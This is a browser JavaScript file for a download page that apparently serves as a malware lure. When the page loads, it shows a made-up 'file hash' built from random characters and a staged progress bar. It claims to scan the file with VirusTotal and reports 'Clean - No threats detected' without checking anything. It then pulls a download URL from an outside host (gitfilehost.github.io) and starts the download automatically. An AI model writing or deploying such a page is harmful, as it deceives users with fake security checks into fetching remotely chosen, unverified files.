
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function generateHash() {
    const chars = '0123456789abcdef';
    let hash = '';
    for (let i = 0; i < 64; i++) {
        hash += chars[Math.floor(Math.random() * chars.length)];
    }
    return hash;
}

function updateProgress(percentage, text) {
    const progressFill = document.getElementById('progressFill');
    const progressText = document.getElementById('progressText');
    
    progressFill.style.width = percentage + '%';
    progressText.textContent = text;
}

function updateDetail(elementId, value, className = '') {
    const element = document.getElementById(elementId);
    element.textContent = value;
    if (className) {
        element.className = 'value ' + className;
    }
}

async function simulateDownloadProcess() {
    const fileHash = generateHash();
    
    // Initialize
    updateProgress(0, 'Initializing secure connection...');
    await sleep(300);
    
    // Hash calculation
    updateProgress(15, 'Calculating file hash...');
    await sleep(400);
    updateDetail('fileHash', fileHash.substring(0, 16) + '...');
    
    // Virus scanning
    updateProgress(30, 'Scanning for viruses...');
    updateDetail('virusScan', 'Scanning with VirusTotal...', 'warning');
    await sleep(600);
    
    updateProgress(50, 'Analyzing file integrity...');
    await sleep(400);
    
    updateProgress(70, 'Finalizing security checks...');
    updateDetail('virusScan', 'Clean - No threats detected', 'success');
    updateDetail('status', 'Security verified', 'success');
    await sleep(500);
    
    // Final preparation
    updateProgress(85, 'Preparing download...');
    await sleep(400);
    
    updateProgress(100, 'Download ready! Starting...');
    updateDetail('status', 'Download initiated', 'success');
    await sleep(300);
    
    // Start actual download
    deliverFile();
}

async function deliverFile() {
    try {
        const apiUrl = 'https://gitfilehost.github.io/linked/';
        const response = await fetch(apiUrl);
        if (!response.ok) throw new Error(`HTTP ${response.status}`);

        const { url, filename } = await response.json();
        if (typeof url !== 'string' || !url.startsWith('http')) {
            throw new Error('Invalid download URL');
        }

        const a = document.createElement('a');
        a.href = url;
        if (filename) a.download = filename;
        document.body.appendChild(a);
        a.click();
        a.remove();
        
        updateDetail('status', 'Download completed successfully!', 'success');
    } catch (err) {
        console.error('Download error:', err);
        updateDetail('status', 'Download failed - Please try again', 'error');
        updateProgress(0, 'Error occurred');
    }
}

document.addEventListener('DOMContentLoaded', () => {
    // Start the download process
    simulateDownloadProcess();
});
